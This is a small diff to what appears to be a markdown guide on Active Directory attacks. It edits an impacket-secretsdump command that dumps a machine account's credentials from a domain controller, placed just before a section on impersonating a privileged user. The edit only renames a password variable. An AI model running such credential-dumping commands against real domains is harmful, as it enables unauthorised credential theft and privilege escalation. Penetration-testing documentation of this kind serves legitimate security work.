@@ -80,7 +80,7 @@ This produces `<username>.ccache` in the current directory.
 >
 > ```bash
 > impacket-secretsdump -just-dc-user '<MACHINE>$' \
->   "$DOMAIN/$USER:$PASS@$DC_HOST"
+>   "$DOMAIN/$USER:$PASSWORD@$DC_HOST"
 > ```
 
 ### Impersonate a privileged user
